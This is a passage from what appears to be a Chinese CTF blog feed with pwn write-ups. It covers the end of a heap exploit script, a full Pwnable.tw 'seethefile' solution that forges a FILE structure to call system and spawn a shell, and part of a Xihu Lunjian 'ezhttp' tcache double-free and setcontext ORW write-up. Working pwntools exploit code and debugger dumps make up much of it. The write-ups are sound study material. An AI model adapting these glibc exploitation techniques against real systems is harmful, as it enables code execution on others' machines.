class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>,p64(<span class="number">0x404048</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x18</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x38</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x48</span>,p64(<span class="number">0x404048</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x48</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x58</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x58</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,p64(<span class="number">0x00401070</span>))</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%p-%p+%p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x12e009</span></span><br><span class="line">info(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;a&#x27;</span>*<span class="number">15</span>+<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Data:&quot;</span>)</span><br><span class="line">p.send(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"><span class="comment"># add(&#x27;a&#x27;+&#x27;\x00&#x27;,&#x27;a&#x27;*0x48+&#x27;\x00&#x27;,p64(libc.sym[&#x27;system&#x27;]))</span></span><br><span class="line"><span class="comment"># add(3,0x20,p64(elf.got[&#x27;printf&#x27;]))</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable.tw seethefile</title>
      <link href="/2020/10/18/Pwnable_seethefile/"/>
      <url>/2020/10/18/Pwnable_seethefile/</url>
      
        <content type="html"><![CDATA[<h3 id="Pwnable-tw-seethefile"><a href="#Pwnable-tw-seethefile" class="headerlink" title="Pwnable.tw seethefile"></a>Pwnable.tw seethefile</h3><blockquote><p>第二次做这道题了，搞懂了第一次做这题不懂的一些细节✈</p></blockquote><span id="more"></span><p>程序允许我们open_file,read_file,write_file，唯一发现的漏洞是在leave_massage的时候输入name可以覆写到bss上的fd.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Leave your name :&quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, name);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Thank you %s ,see you next time\n&quot;</span>, name);</span><br><span class="line"></span><br><span class="line">.bss:<span class="number">0804B</span>0C0 magicbuf        db <span class="number">1</span>A0h <span class="title function_">dup</span><span class="params">(?)</span>          ; DATA XREF: openfile+<span class="number">33</span>↑o</span><br><span class="line">.bss:<span class="number">0804B</span>0C0                                         ; readfile+<span class="number">17</span>↑o ...</span><br><span class="line">.bss:<span class="number">0804B</span>260                 public name</span><br><span class="line">.bss:<span class="number">0804B</span>260 name            db <span class="number">20</span>h <span class="title function_">dup</span><span class="params">(   ?)</span>        ; DATA XREF: main+<span class="number">9F</span>↑o</span><br><span class="line">.bss:<span class="number">0804B</span>260                                         ; main+B4↑o</span><br><span class="line">.bss:<span class="number">0804B</span>280 ; FILE *fp</span><br><span class="line">.bss:<span class="number">0804B</span>280 fp              dd ?                    ; DATA XREF: openfile+<span class="number">6</span>↑r</span><br><span class="line">.bss:<span class="number">0804B</span>280                                         ; openfile+AD↑w ...</span><br></pre></td></tr></table></figure><p>并且题目功能是在于对文件的操作，调用fread,fwrite,fopen,fclose，那这题就是考察io_file了。</p><p>对于io_file的利用，一般是直接覆盖vtable结构体指针指向可控的内存，再者就是构造整个io_file_plus结构体，但这种方法要求我们构造时要绕过一些检查。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _IO_IS_FILEBUF 0x2000</span></span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">_IO_acquire_lock (fp);</span><br><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">  status = _IO_file_close_it (fp);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">_IO_release_lock (fp);</span><br><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure><p>我们要构造出_IO_IS_FILEBUF&#x3D;0的_flags，使得可以绕过上面两个检测例如_flags&#x3D;0xffffdfff（<strong>原理在于0xdf&#x3D;(11011111),0x20&#x3D;(0010000),0xdf&amp;0x20&#x3D;&#x3D;0</strong>），最终执行_IO_FINISH (fp)；</p><p>在C语言中，成功调用fopen函数后会在堆上分配一块空间用于存放_IO_FILE_plus结构体，并且返回结构体的首地址，而在调用fclose时，最终会通过io_file_plus里的vatble调用相应的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x9003008 80</span><br><span class="line">00:0000│   0x9003008 ◂— 0x0</span><br><span class="line">01:0004│   0x900300c ◂— 0x161</span><br><span class="line">02:0008│   0x9003010 ◂— 0xfbad2488   //_flags</span><br><span class="line">03:000c│   0x9003014 —▸ 0x900321d ◂— 0xa5d6f73 (&#x27;so]\n&#x27;)  //io_read_ptr</span><br><span class="line">04:0010│   0x9003018 —▸ 0x90033aa ◂— 0x31203130 (&#x27;01 1&#x27;)  //io_read_end</span><br><span class="line">05:0014│   0x900301c —▸ 0x9003170 ◂— 0x30303030 (&#x27;0000&#x27;)  //io_read_base</span><br><span class="line">... ↓</span><br><span class="line">0a:0028│   0x9003030 —▸ 0x9003570 ◂— 0x0</span><br><span class="line">0b:002c│   0x9003034 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0f:003c│   0x9003044 —▸ 0xf7fa1cc0 (_IO_2_1_stderr_) ◂— 0xfbad2086  //_chain</span><br><span class="line">10:0040│   0x9003048 ◂— 0x3</span><br><span class="line">11:0044│   0x900304c ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">14:0050│   0x9003058 —▸ 0x90030a8 ◂— 0x0</span><br><span class="line">15:0054│   0x900305c ◂— 0xffffffff</span><br><span class="line">... ↓</span><br><span class="line">17:005c│   0x9003064 ◂— 0x0</span><br><span class="line">18:0060│   0x9003068 —▸ 0x90030b4 ◂— 0x0</span><br><span class="line">19:0064│   0x900306c ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">1c:0070│   0x9003078 ◂— 0xffffffff</span><br><span class="line">1d:0074│   0x900307c ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">27:009c│   0x90030a4 —▸ 0xf7fa0ac0 (_IO_file_jumps) ◂— 0x0  //vatable</span><br><span class="line">28:00a0│   0x90030a8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope 0xf7fa0ac0 30</span><br><span class="line">00:0000│   0xf7fa0ac0 (_IO_file_jumps) ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">02:0008│   0xf7fa0ac8 (_IO_file_jumps+8) —▸ 0xf7e57990 (_IO_file_finish) ◂— push   ebx</span><br><span class="line">03:000c│   0xf7fa0acc (_IO_file_jumps+12) —▸ 0xf7e583b0 (_IO_file_overflow) ◂— push   edi</span><br><span class="line">04:0010│   0xf7fa0ad0 (_IO_file_jumps+16) —▸ 0xf7e58150 (_IO_file_underflow) ◂— push   ebp</span><br><span class="line">05:0014│   0xf7fa0ad4 (_IO_file_jumps+20) —▸ 0xf7e59230 (_IO_default_uflow) ◂— push   ebx</span><br><span class="line">06:0018│   0xf7fa0ad8 (_IO_file_jumps+24) —▸ 0xf7e5a0c0 (_IO_default_pbackfail) ◂— push   ebp</span><br></pre></td></tr></table></figure><p>因此我们只要构造好_IO_FILE_plus结构体，并通过name的溢出改fd指向我们构造的_IO_FILE_plus结构体，再执行fclose即可完成利用。</p><p>首先要Leak，题目给了我们任意文件读的机会，因此我们可以通过读取**’&#x2F;proc&#x2F;self&#x2F;maps’**（文件的内存信息存储于此）来得到libc地址。</p><p>接下来就是构造file_plus结构体，几处要点：</p><p>1.构造_flag&#x3D;0xffffdfff，绕过检测去执行((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp)</p><p>2.在fd指向内存的偏移为0x4位置写入’;$0’，;用来分隔命令。</p><p>3.io_file结构体大小为0x94，因此要填充满0x94。</p><p>4.vatble指针指向紧接着的file结构体的内存，方便后面的构造。</p><p>5.vtable结构体对应的__finish函数指针(第3个位置)写为system()</p><p>fake_struct:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x804b300 80</span><br><span class="line">00:0000│ eax  0x804b300 ◂— 0xffffdfff</span><br><span class="line">01:0004│      0x804b304 ◂— 0x30243b /* &#x27;;$0&#x27; */</span><br><span class="line">02:0008│      0x804b308 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">25:0094│      0x804b394 —▸ 0x804b398 —▸ 0xf7e28db0 (system) ◂— sub    esp, 0xc</span><br><span class="line">26:0098│      0x804b398 —▸ 0xf7e28db0 (system) ◂— sub    esp, 0xc</span><br><span class="line">... ↓</span><br><span class="line">29:00a4│      0x804b3a4 ◂— 0x0</span><br></pre></td></tr></table></figure><p>执行((struct IO_FILE_plus *)fp-&gt;vtable)-&gt;__finish(fp)相当于执行system(“xxx;$0”)得到shell🚩</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">openfile</span>(<span class="params">name</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to see :&#x27;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readfile</span>():</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writefile</span>():</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">closefile</span>():</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>(<span class="params">name</span>):</span><br><span class="line">cmd(<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Leave your name :&quot;</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process(<span class="string">&quot;./seethefile&quot;</span>)</span><br><span class="line"></span><br><span class="line">openfile(<span class="string">&quot;/proc/self/maps&quot;</span>)</span><br><span class="line">readfile()</span><br><span class="line">readfile()</span><br><span class="line">readfile()</span><br><span class="line">writefile()</span><br><span class="line">p.recvline()</span><br><span class="line">libc.address=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0x1b4000</span>+<span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;libc : &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">fake_struct=<span class="number">0x0804B300</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+p32(fake_struct)   <span class="comment">#fd-&gt;fake_struct</span></span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*(fake_struct-<span class="number">0x0804B280</span>-<span class="number">4</span>)</span><br><span class="line">payload+=<span class="string">&#x27;\xff\xdf\xff\xff;$0\x00&#x27;</span>.ljust(<span class="number">0x94</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p32(fake_struct+<span class="number">0x98</span>)</span><br><span class="line">payload+=p32(libc.sym[<span class="string">&#x27;system&#x27;</span>])*<span class="number">3</span></span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b*0x08048B0F&#x27;</span>)</span><br><span class="line">leave(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>fclose部分源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* libio/iofclose.c */</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_new_fclose (_IO_FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> status;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*这里本来有个对版本进行检测的代码，根据FILE结构中_vtable_offset变量是否为0来判断，不为0则执行_IO_old_fclose*/</span></span><br><span class="line">  <span class="comment">/* First unlink the stream.  */</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((<span class="keyword">struct</span> _IO_FILE_plus *) fp);  <span class="comment">// unlink即：将fp指向的FILE结构体从_IO_list_all的单向链表中取下</span></span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);   <span class="comment">//关闭fp</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? <span class="number">-1</span> : <span class="number">0</span>;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_mode &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> _LIBC</span></span><br><span class="line">      <span class="comment">/* This stream has a wide orientation.  This means we have to free</span></span><br><span class="line"><span class="comment">     the conversion functions.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cc</span> =</span> fp-&gt;_codecvt;</span><br><span class="line"></span><br><span class="line">      __libc_lock_lock (__gconv_lock);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_in.__cd.__steps);</span><br><span class="line">      __gconv_release_step (cc-&gt;__cd_out.__cd.__steps);</span><br><span class="line">      __libc_lock_unlock (__gconv_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (_IO_have_backup (fp))</span><br><span class="line">    _IO_free_backup_area (fp);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">if</span> (fp != _IO_stdin &amp;&amp; fp != _IO_stdout &amp;&amp; fp != _IO_stderr)</span><br><span class="line">    &#123;</span><br><span class="line">      fp-&gt;_IO_file_flags = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">free</span>(fp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考博文:<br>(<a href="https://www.jianshu.com/p/0176ebe02354">https://www.jianshu.com/p/0176ebe02354</a>)</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西湖论剑</title>
      <link href="/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_Quals_ezhttp/"/>
      <url>/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_Quals_ezhttp/</url>
      
        <content type="html"><![CDATA[<h3 id="西湖论剑-ezhttp"><a href="#西湖论剑-ezhttp" class="headerlink" title="西湖论剑 ezhttp"></a>西湖论剑 ezhttp</h3><blockquote><p>花了一下午做这题，被没有符号表的libc折磨的死去活来，不知道为啥我电脑ubuntu18的libcTM升级到1.3的没法tcache double free了，赛后自己编译了一个带dbg符号的，再ld_preload就可以了。</p></blockquote><p>这题是道套了层类似http收发形式的堆体，逆这个收发花费了大部分的时间，这个就没什么好说的了，只要写下后面的利用手段吧：</p><span id="more"></span><p>add函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">v2 = <span class="built_in">strlen</span>(&amp;src);</span><br><span class="line">  heaplist[<span class="number">2</span> * i] = <span class="built_in">malloc</span>(v2);</span><br><span class="line">  <span class="keyword">if</span> ( !heaplist[<span class="number">2</span> * i] )</span><br><span class="line">  &#123;</span><br><span class="line">    quit((__int64)<span class="string">&quot;HTTP/1.1 500 INTERNAL SERVER ERROR&quot;</span>, (__int64)<span class="string">&quot;Something error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  heaplist[<span class="number">2</span> * i + <span class="number">1</span>] = (<span class="type">void</span> *)<span class="built_in">strlen</span>(&amp;src);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(&amp;src);</span><br><span class="line">  <span class="built_in">strncpy</span>((<span class="type">char</span> *)heaplist[<span class="number">2</span> * i], &amp;src, v3);</span><br></pre></td></tr></table></figure><p>  看到它是用strlen获取content的长度，之后malloc再strncpy，strlen会被’\x00’截断，在后面构造时给我带来了不少的麻烦。</p><p>  dele函数有uaf:<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(heaplist[<span class="number">2</span> * idx]);</span><br><span class="line">heaplist[<span class="number">2</span> * idx + <span class="number">1</span>] = <span class="number">0LL</span>;                  <span class="comment">// UAF</span></span><br><span class="line">quit((__int64)<span class="string">&quot;HTTP/1.1 200 OK&quot;</span>, (__int64)<span class="string">&quot;Delete success!&quot;</span>);</span><br></pre></td></tr></table></figure></p><p>  edit还是正常的，哦对结尾加个’\n’：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; src[i] != <span class="string">&#x27;\n&#x27;</span>; ++i )</span><br><span class="line">  ;</span><br><span class="line"><span class="keyword">if</span> ( v4 &lt; <span class="number">0</span> || v4 &gt; <span class="number">15</span> || !heaplist[<span class="number">2</span> * v4] || i &gt; (__int64)heaplist[<span class="number">2</span> * v4 + <span class="number">1</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  quit((__int64)<span class="string">&quot;HTTP/1.1 404 Not Found&quot;</span>, (__int64)<span class="string">&quot;No!You can&#x27;t&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(heaplist[<span class="number">2</span> * v4], src, i);</span><br></pre></td></tr></table></figure></p><p>由于没有show，add函数给了我们堆地址因此自然想到double free打tcache的结构体，之后dele0x100的堆进入unsortedbin写入main_arena地址，double free同时改main_arena后2字节来打stdout，但由于add时的’\x00’限制，要改写地址为stdout上面的地址，并填充’a’但0xfbad18不能改，其他都填’a’，开始以为不行，但仍能成功泄露，有点nb，之后由于有seccomp所以改free_hook为setcontext+53，并在0x100的堆里写payload，之后dele。利用setcontext+53来构造寄存器(rdi&#x3D;0,rsi&#x3D;heap+0xa0,rdx&#x3D;0x200)，rsp改到heap+0xa8，之后返回时去执行read读入后续的shellcode到栈里面rsp位置然后ret到shellcode来orw。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x555556d1f320</span><br><span class="line">00:0000│   0x555556d1f320 ◂— 0x67616c662f2e /* &#x27;./flag&#x27; */</span><br><span class="line">01:0008│   0x555556d1f328 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; telescope 0x555556d1f320 100</span><br><span class="line">00:0000│      0x555556d1f320 ◂— 0x67616c662f2e /* &#x27;./flag&#x27; */</span><br><span class="line">01:0008│      0x555556d1f328 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">0e:0070│      0x555556d1f390 —▸ 0x555556d1f3c0 —▸ 0x7fb514444a78 (mblen+104) ◂— pop    rax</span><br><span class="line">0f:0078│      0x555556d1f398 —▸ 0x555556d21000 ◂— 0x0</span><br><span class="line">10:0080│      0x555556d1f3a0 ◂— 0x200</span><br><span class="line">... ↓</span><br><span class="line">12:0090│      0x555556d1f3b0 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">14:00a0│ rsi  0x555556d1f3c0 —▸ 0x7fb514444a78 (mblen+104) ◂— pop    rax</span><br><span class="line">... ↓</span><br><span class="line">17:00b8│      0x555556d1f3d8 ◂— 0x0</span><br><span class="line">18:00c0│      0x555556d1f3e0 —▸ 0x7fb5144d39d5 (__time_syscall+5) ◂— syscall</span><br><span class="line">19:00c8│ rsp  0x555556d1f3e8 ◂— 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 